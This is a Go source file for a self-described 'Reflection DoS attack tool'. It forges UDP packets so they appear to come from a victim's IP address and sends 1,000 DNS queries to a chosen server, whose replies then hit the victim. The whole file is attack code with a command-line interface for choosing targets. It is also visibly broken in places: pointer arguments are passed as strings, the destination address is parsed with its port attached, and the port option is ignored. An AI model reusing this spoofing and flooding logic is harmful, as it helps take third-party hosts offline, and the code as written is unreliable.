package main

import (
	"errors"
	"fmt"
	"net"
	"os"
	"strconv"
	"time"

	"github.com/akamensky/argparse"
	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
	"github.com/rs/zerolog"
	"github.com/rs/zerolog/log"
)

var logger zerolog.Logger

func sendLogger(victim string, dns string, dns_port int) {
	logger.Info().Str("Sent request DNS to ", dns).Int("port", dns_port).Str("Reflected to victim ", victim).Msg("Successfully")
}

func Spam_requests(victim string, dns string, dns_port int) {
	dns_addr := dns + ":" + fmt.Sprint(dns_port)
	iface := "h2-eth0"
	handle, err := pcap.OpenLive(iface, 65536, false, pcap.BlockForever)
	if err != nil {
		log.Fatal(err)
	}
	defer handle.Close()

	ip := &layers.IPv4{
		SrcIP:    net.ParseIP(victim).To4(), //Spoofed IP
		DstIP:    net.ParseIP(dns_addr).To4(),
		Protocol: layers.IPProtocolUDP,
	}

	udp := &layers.UDP{
		SrcPort: 44444,
		DstPort: 5353,
	}
	udp.SetNetworkLayerForChecksum(ip)

	// Minimal DNS query packet (for domain "google.com")
	dnsQuery := []byte{
		0xaa, 0xaa, // ID
		0x01, 0x00, // Standard query
		0x00, 0x01, 0x00, 0x00, // 1 question, 0 answers
		0x00, 0x00, 0x00, 0x00, // 0 authority, 0 additional
		0x07, 'g', 'o', 'o', 'g', 'l', 'e',
		0x03, 'c', 'o', 'm', 0x00,
		0x00, 0x01, 0x00, 0x01, // Type A, Class IN
	}

	buffer := gopacket.NewSerializeBuffer()
	opts := gopacket.SerializeOptions{ComputeChecksums: true, FixLengths: true}

	err = gopacket.SerializeLayers(buffer, opts,
		ip,
		udp,
		gopacket.Payload(dnsQuery),
	)
	if err != nil {
		log.Fatal(err)
		return
	}

	for i := 0; i < 1000; i++ {
		err := handle.WritePacketData(buffer.Bytes())
		if err != nil {
			logger.Error().Err(err).Msg("Failed to create send packet")
		} else {
			sendLogger(victim, dns, dns_port)
		}
		time.Sleep(50 * time.Millisecond)
	}
}

func main() {
	// logger setup
	zerolog.TimeFieldFormat = zerolog.TimeFormatUnix
	zerolog.SetGlobalLevel(zerolog.InfoLevel)
	logger = log.Output(zerolog.ConsoleWriter{Out: os.Stderr}).With().Timestamp().Logger()

	// argument parser setup
	parser := argparse.NewParser("rf-dos", "Reflection DoS attack tool")

	victim := parser.String("", "victim", &argparse.Options{
		Required: true,
		Help:     "Target Victim",
		Validate: func(args []string) error {
			if len(args[0]) == 0 {
				return errors.New("victim cannot be empty")
			} else {
				ip := net.ParseIP(args[0])
				if ip == nil {
					return errors.New("victim must be a valid IP address")
				}
				if ip.To4() == nil {
					return errors.New("victim must be a valid IPv4 address")
				}
				if ip.IsLoopback() {
					return errors.New("victim cannot be a loopback address")
				}

				if ip.IsUnspecified() {
					return errors.New("victim cannot be an unspecified address")
				}
			}
			return nil
		},
	})

	dns_server := parser.String("", "dns_server", &argparse.Options{
		Required: true,
		Help:     "Target Dns_server",
		Validate: func(args []string) error {
			if len(args[0]) == 0 {
				return errors.New("Dns_server cannot be empty")
			} else {
				ip := net.ParseIP(args[0])
				if ip == nil {
					return errors.New("Dns_server must be a valid IP address")
				}
				if ip.To4() == nil {
					return errors.New("Dns_server must be a valid IPv4 address")
				}
				if ip.IsLoopback() {
					return errors.New("Dns_server cannot be a loopback address")
				}

				if ip.IsUnspecified() {
					return errors.New("Dns_server cannot be an unspecified address")
				}
			}
			return nil
		},
	})

	dns_port := parser.Int("", "dns_port", &argparse.Options{
		Required: false,
		Help:     "Target victim_port, default is 5353",
		Default:  5353,
		Validate: func(args []string) error {
			val, err := strconv.Atoi(args[0])
			if err != nil {
				return errors.New("port must be a number")
			}

			if val <= 0 || val >= 65535 {
				return errors.New("port must be between 1 and 65535")
			}
			return nil
		},
	})

	/* for later use
	threaded := parser.Int("t", "threaded", &argparse.Options{
		Required: false,
		Help:     "Enable threaded brute force mode with a limit of n threads. No effect if password list is not used",
		Validate: func(args []string) error {
			val, err := strconv.Atoi(args[0])
			if err != nil {
				return errors.New("thread count must be a number")
			}

			if val <= 1 {
				return errors.New("thread count must be greater than 1")
			}
			return nil
		},
	})*/

	Spam_requests(victim, dns_server, dns_port)
}
